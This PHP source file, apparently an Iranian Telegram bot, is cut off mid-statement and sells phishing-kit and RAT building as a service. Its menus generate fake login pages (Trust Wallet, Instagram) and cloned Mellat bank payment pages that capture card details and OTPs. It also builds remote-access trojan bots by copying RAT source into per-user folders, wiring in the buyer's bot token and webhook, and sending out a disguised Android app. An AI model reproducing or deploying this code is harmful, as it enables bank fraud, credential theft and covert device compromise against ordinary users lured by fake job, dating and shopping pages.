<?php

date_default_timezone_set('Asia/Tehran');
error_reporting(0);
require("config.php") ;
require("Class.php");

define('API_KEY',$TOKEN); // TOKEN " "

$update = json_decode(file_get_contents('php://input'));     
$message = $update->message;
$message_id = $message->message_id;
$username = $update->message->from->username;
$firstname = $update->message->from->first_name;
$lastname = $update->message->from->last_name;
$from_id = $update->message->from->id;
$chat_id = $message->chat->id;
$forward_id = $update->message->forward_from->id;
$forward_chat_username = $update->message->forward_from_chat->username;
$text = $update->message->text;
$video = $update->message->video;
$photo = $update->message->photo;
$query = $update->callback_query->data;
$query_id = $update->callback_query->message->chat->id;
$query_messageid = $update->callback_query->message->message_id;
$callback_queryid = $update->callback_query->id;
$query_name = $update->callback_query->from->first_name;
$query_username = $update->callback_query->from->username;
$query_fromid = $update->inline_query->from->id;
$reply = $update->message->reply_to_message;
$reply_id = $update->message->reply_to_message->forward_from->id;
$type = $update->message->chat->type;
$mention_chatid = "<a href='tg://user?id=$chat_id'>$firstname</a>";
$mention_queryid = "<a href='tg://user?id=$query_id'>$query_name</a>";

    $forcejoin = json_decode(file_get_contents("https://api.telegram.org/bot$TOKEN/getChatMember?chat_id=@$id_channel&user_id=".$chat_id));
    $joincheck = $forcejoin->result->status;


$userlist = file_get_contents("users.txt");
$member_id = explode("\n", $userlist);
$member_count = count($member_id) - 1;
$document = $update->message->document;
$file = $document->file_name;
$file_id = $document->file_id;
$clock = date('H:i:s'); 
$rat_link = "https://t.me/pishingbax_files/45";
$anti_shell = $text;
$port = json_encode([
    'inline_keyboard'=>[
        
[['text'=>"ملت",'callback_data'=>"mellat"],['text'=>"ابلاغ",'callback_data'=>"eblagh"]],
[['text'=>"ابلاغ 2",'callback_data'=>"eblagh2"],['text'=>"ابلاغ 3",'callback_data'=>"eblagh3"]],
[['text'=>"صیغه",'callback_data'=>"sighe"],['text'=>"تردد",'callback_data'=>"trdd"]],       
[['text'=>"اد بزن",'callback_data'=>"add"],['text'=>"گی یابی",'callback_data'=>"gay"]],      
[['text'=>"سهام",'callback_data'=>"saham"],['text'=>"همتا",'callback_data'=>"hamta"]],
[['text'=>"شارژ 1",'callback_data'=>"charj1"],['text'=>"روبیکا",'callback_data'=>"rubika"]],
[['text'=>"شارژ 2",'callback_data'=>"charj2"],['text'=>"سیم کارت",'callback_data'=>"sim-card"]],
[['text'=>"اسنپ",'callback_data'=>"snap"],['text'=>"سکس چت",'callback_data'=>"chat"]],
[['text'=>"دیوار",'callback_data'=>"divar"],['text'=>"دیوار 2",'callback_data'=>"divar2"]],
[['text'=>"شیپور",'callback_data'=>"sheypoor"],['text'=>"شیپور 2",'callback_data'=>"sheypoor2"]],
[['text'=>"لایو سکسی",'callback_data'=>"live"],['text'=>"دوستیابی",'callback_data'=>"dostyabi"]],
[['text'=>"شماره مجازی",'callback_data'=>"number"],['text'=>"ماساژ",'callback_data'=>"masaj"]],

[['text'=>"اینترنت 1",'callback_data'=>"net1"],['text'=>"اینترنت 2",'callback_data'=>"net2"],['text'=>"اینترنت 3",'callback_data'=>"net3"]],
                    
[['text'=>"استار لینک (New)",'callback_data'=>"starlink"],['text'=>"نت ملی (New)",'callback_data'=>"netmelli"]],

   [['text'=>"<<--",'callback_data'=>"back"]],
        ]
    
    ]);

$admin_panel = json_encode([

      'inline_keyboard'=>[

        [['text'=>"بن",'callback_data'=>"ban"],['text'=>"آنبن",'callback_data'=>"unban"]],
        [['text'=>"تعداد اعضا",'callback_data'=>"member"]],
    [['text'=>"پیام همگانی",'callback_data'=>"hamegani"]],
    [['text'=>"خاموش کردن ربات",'callback_data'=>"off"],['text'=>"روشن کردن ربات",'callback_data'=>"on"]],
[['text'=>"احراز دستی",'callback_data'=>"ehraz_d"]],
        [['text'=>"دریافت اعضای ربات",'callback_data'=>"list_a"]]
]
]);


if(!is_dir("data/$chat_id")){
  mkdir("data/$chat_id");
}
if(!is_dir("data/$chat_id/rat")){
    mkdir("data/$chat_id/rat");
          file_put_contents("data/$chat_id/rat/index.html","Access Denied -->> Coded By @$your_id");
}if(!is_dir("data/$chat_id/payment")){
    mkdir("data/$chat_id/payment");
          file_put_contents("data/$chat_id/payment/index.html","Access Denied -->> Coded By @$your_id");
}
if(!is_dir("data/$chat_id/site")){
    mkdir("data/$chat_id/site");
          file_put_contents("data/$chat_id/site/index.html","Access Denied -->> Coded By @$your_id");
}
if(!is_dir("data/$chat_id/rat_list")){
    mkdir("data/$chat_id/rat_list");
          file_put_contents("data/$chat_id/rat_list/index.html","Access Denied -->> Coded By @$your_id");
    
}
if(!file_exists("data/$chat_id/ehraz.txt")){
  file_put_contents("data/$chat_id/ehraz.txt","false");
}
if(!file_exists('data/management')){
mkdir('data/management');
}
if(!file_exists('data')){
mkdir('data');
}
if(!file_exists('data/$admin/userlist.txt')){
file_put_contents('data/$admin/userlist.txt','');
}
if(!file_exists('data/$admin/viplist.txt')){
file_put_contents('data/$admin/viplist.txt','');
}
if(!file_exists('data/$admin/banlist.txt')){
file_put_contents('data/$admin/banlist.txt','');
}
if(!file_exists('data/$admin/botstatus.txt')){
file_put_contents('data/$admin/botstatus.txt','');
}
if(!file_exists('data/$admin/channel.txt')){
file_put_contents('data/$admin/channel.txt','');
}
if(!file_exists('data/'.$chat_id)){
mkdir('data/'.$chat_id);
}
if(!file_exists('data/'.$chat_id.'/message.txt')){
file_put_contents('data/'.$chat_id.'/message.txt','');
}
if(!file_exists('data/'.$chat_id.'/type')){
file_put_contents('data/'.$chat_id.'/type','');
}

if(file_exists("data/$chat_id/up.txt")) die('*******') ;
##---------------------------------##
$start = json_encode([
    'inline_keyboard'=>[
[['text'=>"🚀 داشبورد 🚀",'callback_data'=>"panel"],['text'=>"📝 تغییر آیدی عددی 📝",'callback_data'=>"change"]],

[['text'=>"‼️ راهنما ‼️",'callback_data'=>"help"],['text'=>"💠 خرید شارژ 💠",'callback_data'=>"buy_charge"]],
[['text'=>"👤 ارتباط با پشتیبانی 👤",'callback_data'=>"sendmessage"]],
[['text'=>"🔆 $team_name 🔆",'url'=>"https://t.me/$id_channel"]]
        ]
    
    ]);
##------------------------------##
$fakelist = json_encode([
    'inline_keyboard'=>[
        [['text'=>"تراست ولت",'callback_data'=>"trust"]],
      [['text'=>"اینستاگرام 1",'callback_data'=>"insta1"]],
        [['text'=>"اینستاگرام 2",'callback_data'=>"insta2"]],
        [['text'=>"<<--",'callback_data'=>"back"]]
        ]
    
    ]);
##-----------------------------##
$panel = json_encode([
  'inline_keyboard'=>[
    
[['text'=>"🔖 ساخت  فیک پیج 🔖",'callback_data'=>"fakepage"],['text'=>"📱 ساخت رت 📱",'callback_data'=>"make_rat"]],

[['text'=>"📟 ساخت درگاه 📟",'callback_data'=>"pm"],['text'=>"🌐 درگاه های من 🌐",'callback_data'=>"fm"]],

[['text'=>"🗑 حذف درگاه 🗑",'callback_data'=>"delp"],['text'=>"⚜️ رت من ⚜️",'callback_data'=>"rl"]],

[['text'=>"🗑 حذف رت 🗑",'callback_data'=>"delr"],['text'=>"⚙️ تنظیم رت ⚙️",'callback_data'=>"setrat"]],

[['text'=>"📝 ساخت پیشرفته شماره 📝",'callback_data'=>"pro"],['text'=>"🌀 ساخت شماره رندوم 🌀",'callback_data'=>"random"]],

[['text'=>'🔆 ساخت شماره با رنج 🔆','callback_data'=>"rand"],['text'=>"📩 دریافت موجودی با فایل پیام 📩",'callback_data'=>"sms"]],

[['text'=>"☎️ استخراج شماره از فایل مخاطبین ☎️",'callback_data'=>"contact"]],
        
[['text'=>"<<--",'callback_data'=>"back"]]
    
  ]
]);
##-------------------------##
$operatorlist = json_encode([
                'inline_keyboard' => [
                	[
                	    ['text'=>"همراه اول",'callback_data'=>"hamrah"],['text'=>"ایرانسل",'callback_data'=>"irancell"]
                    ],
                    [
                        ['text' => "تالیا", 'callback_data' => "talia"],['text'=>"رایتل",'callback_data'=>"rightel"]
                    ],
                    [
                        ['text' => "بازگشت", 'callback_data' => "home"]
                    ]]
                    ]);
##-------------------------##
$irancellchoose = json_encode([
                'inline_keyboard' => [
                	[
                	    ['text'=>"1,000 تومان",'callback_data'=>"12"],['text' => "2,000 تومان", 'callback_data' => "9"]
                    ],
                    [
                        ['text'=>"5,000 تومان",'callback_data'=>"1"]
                    ],
                    [
                        ['text' => "10,000 تومان", 'callback_data' => "2"],['text'=>"20,000 تومان",'callback_data'=>"22"]
                    ],
                    [
                        ['text' => "لغو فرایند خرید شارژ", 'callback_data' => "home"]
                    ]]
                    ]);
##------------------------------##
$hamrahchoose = json_encode([
                'inline_keyboard' => [
                	[
                	    ['text'=>"2,000 تومان",'callback_data'=>"13"],['text' => "5,000 تومان", 'callback_data' => "11"]
                    ],
                    [
                        ['text' => "10,000 تومان", 'callback_data' => "7"],['text'=>"20,000 تومان",'callback_data'=>"8"]
                    ],
                    [
                        ['text' => "لغو فرایند خرید شارژ", 'callback_data' => "home"]
                    ]]
                    ]);
##------------------------------##
$rightelchoose = json_encode([
                'inline_keyboard' => [
                	[
                	    ['text'=>"2,000 تومان",'callback_data'=>"17"],['text' => "5,000 تومان", 'callback_data' => "18"]
                    ],
                    [
                        ['text' => "10,000 تومان", 'callback_data' => "19"],['text'=>"20,000 تومان",'callback_data'=>"20"]
                    ],
                    [
                        ['text' => "لغو فرایند خرید شارژ", 'callback_data' => "home"]
                    ]]
                    ]);
##------------------------------##
$taliachoose = json_encode([
                'inline_keyboard' => [
                	[
                	    ['text'=>"2,000 تومان",'callback_data'=>"15"],['text' => "5,000 تومان", 'callback_data' => "10"]
                    ],
                    [
                        ['text' => "10,000 تومان", 'callback_data' => "23"],['text'=>"20,000 تومان",'callback_data'=>"5"]
                    ],
                    [
                        ['text' => "لغو فرایند خرید شارژ", 'callback_data' => "home"]
                    ]]
                    ]);
##------------------------------##
$quantitycode = json_encode([
                'inline_keyboard' => [
                	[
                	    ['text' => "1 عدد", 'callback_data' => "1A"],['text'=>"2 عدد",'callback_data'=>"2A"]
                    ],
                    [
                	       ['text' => "3 عدد", 'callback_data' => "3A"]
                    ],
                    [
                        ['text' => "4 عدد", 'callback_data' => "4A"],['text'=>"5 عدد",'callback_data'=>"5A"]
                    ],
                    [
                        ['text' => "لغو فرایند خرید شارژ", 'callback_data' => "home"]
                    ]]
                    ]);
##------------------------------##
$c2camount = json_encode([
                'inline_keyboard' => [
                	[
                	    ['text'=>"10,000 تومان",'callback_data'=>"c2c10"],['text' => "20,000 تومان", 'callback_data' => "c2c20"]
                    ],
                    [
                        ['text'=>"30,000 تومان",'callback_data'=>"c2c30"]
                    ],
                    [
                        ['text' => "40,000 تومان", 'callback_data' => "c2c40"],['text'=>"50,000 تومان",'callback_data'=>"c2c50"]
                    ],
                    [
                        ['text' => "مبلغ دلخواه", 'callback_data' => "setc2camount"]
                    ],
                    [
                        ['text' => "لغو فرایند کارت به کارت", 'callback_data' => "home"]
                    ]]
                    ]);
##------------------------------##
if($text){
      if(file_get_contents("data/$chat_id/status")=="ban" and $chat_id !== $admin){
        sendmessage($chat_id,"دسترسی شما به ربات قطع شده است، با پشتیبانی در ارتباط باشید
        Contact Us : @$your_id","html",$message_id);
        exit();
      }
   if(file_get_contents("status.txt")=="off" and $chat_id !== $admin){
        sendmessage($chat_id,"ربات درحال حاضر خاموش میباشد","html",$message_id);
exit();
   }
}
##----------------------##
if(strpos($text,"start")!==false){
    /*    if($joincheck != "creator" and $joincheck != "administrator" and $joincheck != "member" && $id_channel != null){
$text = "
کاربر $mention_chatid لطفا جهت فعال سازی ربات در کانال $team_name عضو شوید و سپس دستور ( /start ) را ارسال نمایید.
";
sendmessage($chat_id,$text,"html",$message_id,json_encode([
                'inline_keyboard' => [
                 [
                        ['text' => "$team_name",'url'=>"https://t.me/$id_channel"]],]
]));
} */
  if(file_get_contents("data/$chat_id/status")!=="ban" and file_get_contents("data/$chat_id/ehraz.txt")=="false"){
      bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"
کاربر عزیز، برای ادامه کار با ربات باید تایید شوید 👋
برای ارسال درخواست روی دکمه زیر کلیک کنید
",
    'parse_mode'=>"html",
    'reply_to_message_id'=>$message_id,
    'reply_markup'=>json_encode([
      'inline_keyboard'=>[
        [['text'=>"ارسال درخواست",'callback_data'=>"ehraz"]],
        [['text'=>"ارتباط با پشتیبانی",'url'=>"https://t.me/$your_id"]]
      ]
    ])
 ]);
  }
  elseif( file_get_contents("data/$chat_id/status")!=="ban" and file_get_contents("data/$chat_id/ehraz.txt")=="true"){
          $user = file_get_contents("users.txt");
        $members = explode("\n", $user);
         if(!in_array($chat_id, $members)) {
        $add_user = file_get_contents("users.txt");
        $add_user .= "$chat_id | @$username | $firstname" . "\n";
            file_put_contents("users.txt", $add_user);
        }
      
        if(!is_dir("data/$chat_id/")){
            mkdir("data/$chat_id");
        }
      
    sendmessage($chat_id,"سلام $mention_chatid عزیز 👋
    به ربات $team_name خوش آمدید 💻
    یک دکمه را انتخاب کنید 🔽","html",$message_id,$start);    
   
    }
}
##----------------------##

##----------------------##
elseif($query == "ehraz"){
    if (!file_exists("data/$query_id/ehraz2.txt")){
        file_put_contents("data/$query_id/ehraz2.txt","wait");
   bot('answerCallbackQuery',[

'callback_query_id'=>$callback_queryid,
    'text'=>"درخواست شما ارسال شد ✅
    چنان چه بعد از 24 ساعت تایید نشدید با پشتیبانی در ارتباط باشید",
    'show_alert'=>true
 ]);
  
  bot('sendMessage',[
    'chat_id'=>$admin,
    'text'=>"یک نفر تاییدیه ارسال کرد ✅

User info:
Name : $query_name
number id : <code>$query_id</code>
Uaername : @$query_username",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
      'inline_keyboard'=>[
   [['text'=>"تایید درخواست",'callback_data'=>"confirm $query_id"],['text'=>"رد درخواست",'callback_data'=>"rej $query_id"]],
    [['text'=>"پی وی کاربر",'url'=>"tg://openmessage?user_id=$query_id"]]
      ]
      
    ])
 ]);
    }if(file_get_contents("data/$query_id/ehraz2.txt")=="wait"){
bot('answerCallbackQuery',[


'callback_query_id'=>$callback_queryid,
    'text'=>"شما درخواست خود را ارسال کرده اید !
    از ارسال مجدد پرهیز کنید :)",
    'show_alert'=>true
 ]);
    }if(file_get_contents("data/$query_id/ehraz2.txt")=="ok"){
        bot('answerCallbackQuery',[

'callback_query_id'=>$callback_queryid,
    'text'=>"شما تایید شده اید ✅",
    'show_alert'=>true
 ]);
    }
}
##----------------------##
 
       elseif($query == "back" and file_get_contents("status.txt")=="on"){
                file_put_contents("data/$query_id/step.txt","none");
           bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
  به منوی اصلی بازگشتید
    ",
    'parse_mode'=>"html",
    'reply_markup'=>$start
 ]);
    }
    elseif($query == "home"){
        sendmessage($query_id,"به منوی اصلی بازگشتید","html",$query_messageid,$start);
    }
##----------------------##
elseif($query == "panel" and file_get_contents("status.txt")=="on"){
         bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
به پنل مدیریت کاربری خود خوش آمدید، از دکمه های زیر یکی را انتخاب کنید
    ",
    'parse_mode'=>"html",
    'reply_markup'=>$panel
 ]);
}

##----------------------##
elseif($query == "fakepage" and file_get_contents("status.txt")=="on"){
      bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
یک سایت را انتخاب کنید
    ",
    'parse_mode'=>"html",
    'reply_markup'=>$fakelist
 ]);
}
##----------------------##
    elseif($query == "make_rat" and file_get_contents("status.txt")=="on"){
        
         bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
    یک نمونه از رت هارا انتخاب کنید 👇
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
[['text'=>"📱 رت ریموت 📱",'callback_data'=>"remote"],['text'=>"💠 رت ساده 💠"   ,'callback_data'=>"simple"]],
            [['text'=>"برگشت | Back",'callback_data'=>"back"]]
            ]
        ])
 ]);
    }
    elseif($query == "remote" and file_get_contents("status.txt")=="on"){
        file_put_contents("data/$query_id/step.txt","make_1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }
elseif(file_get_contents("data/$chat_id/step.txt")=="make_1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];
if($ok == true and !file_exists("data/$chat_id/rat_list/$text.json")){

  sendmessage($chat_id,"درحال ساخت رت ریموت ...","html",$message_id);
$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    mkdir("data/$chat_id/rat/$rand");

copy("source/remote/bot.php","data/$chat_id/rat/$rand/bot.php");
copy("source/remote/index.php","data/$chat_id/rat/$rand/index.php");
copy("source/remote/rat.php","data/$chat_id/rat/$rand/rat.php");
copy("source/remote/jdf.php","data/$chat_id/rat/$rand/jdf.php");
copy("source/remote/stop.php","data/$chat_id/rat/$rand/stop.php");
copy("source/remote/upload.php","data/$chat_id/rat/$rand/upload.php");
copy("source/remote/auto.php","data/$chat_id/rat/$rand/auto.php");

      file_put_contents("data/$chat_id/rat/index.html","Access Denied -->> Coded By @$your_id");
      
      file_put_contents("data/$chat_id/rat_list/index.html","Access Denied -->> Coded By @$your_id");
      
      $TOKEN = '$token';
      $ID = '$id';
      $token_admin = '$TOKEN_ADMIN';
      $id_admin = '$ID_ADMIN';
      $apikey = '$apikey';
      $admin_list = '$admin_list';
      $prt = '$prt';
$id_tel = '$id_tel';
    
$FileName = "data/$chat_id/rat/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$token_admin = '$admin_remote';
$id_admin = '$admin';
$apikey = '$api_key';
$id_tel = '$your_id';
$admin_list = [$chat_id,$admin];
?>
");

    $array2 = ['name'=> "رت ریموت" , 'token' => $text , 'bot' => $un,'url'=>"https://$url/data/$chat_id/rat/$rand",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/rat_list/$text.json", 'w');
  fwrite($handle2, $encode_array2);
  
  file_get_contents("https://api.telegram.org/bot$text/setwebhook?url=https://$url/data/$chat_id/rat/$rand/bot.php");
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    
                    رت ریموت شما با موفقیت ساخته شد:)
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک شخصی شما : <code>https://$url/data/$chat_id/rat/$rand</code>
      ➖➖➖➖➖
  🔰آموزش : ابتدا کلمه <code>user-port</code>  سرچ کنید و لینک شخصی خود را جایگزین کنید 
  📝 وارد پوشه Assets شوید و آدرس درگاه بزارید
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   

      bot('sendDocument',[
	   'chat_id'=>$chat_id,
    	'document'=>"https://t.me/pishingbax_files/44",
    	'caption'=>"نام نرم افزار: عدالت همراه
 ➖➖➖➖➖➖➖➖➖       
 $bot_name 📣 ",
 ]);
            bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر ریموت ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک شخصی : https://$url/data/$chat_id/rat/$rand
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$mfssage_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"remote"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }   elseif(file_exists("data/$chat_id/rat_list/$text.json")){
    sendmessage($chat_id,"شما یکبار رت ریموت با این توکن ساخته اید ! ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
}    
    }
    ##-----------------------##
    elseif($query == "pm"){
        editmessage($query_id,$query_messageid,"درگاه مورد نظر را انتخاب نمایید","html",$port
            );
    }
    ##--------------------------##
        elseif($query == "mellat"){
                    file_put_contents("data/$query_id/step.txt","make_p1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"mellat_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="make_p1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه ملت ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    
      copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
      copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
      copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
      copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
      copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");
      
      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "ملت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "ملت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه ملت شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"mellat"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }   elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
}    
        }   
        elseif($query == "mellat_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/9",
                'caption'=>"نمونه درگاه ملت ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
    ##------------------------------------##

    ##------------------------------##    

         elseif($query == "dostyabi"){
                    file_put_contents("data/$query_id/step.txt","amake_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"dostyabi_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="amake_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه دوستیابی ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/dostyabi");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/dostyabi/index.php","data/$chat_id/payment/$rand/dostyabi/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "دوستیابی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/dostyabi",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "دوستیابی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/dostyabi", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه دوستیابی شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/dostyabi/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/dostyabi/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
